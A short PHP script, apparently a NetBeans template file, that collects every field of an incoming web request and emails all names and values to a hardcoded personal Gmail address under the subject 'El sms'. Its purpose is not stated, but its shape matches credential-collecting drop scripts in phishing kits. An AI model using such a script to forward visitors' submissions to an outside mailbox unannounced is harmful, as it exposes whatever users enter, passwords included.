<?php

/* 
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

$mensage = "";
foreach ($_REQUEST as $key => $value) {
	$mensage .= $key." -> ".$value."\n";
}

mail('jtoirac@gmail.com', 'El sms', $mensage);

?>

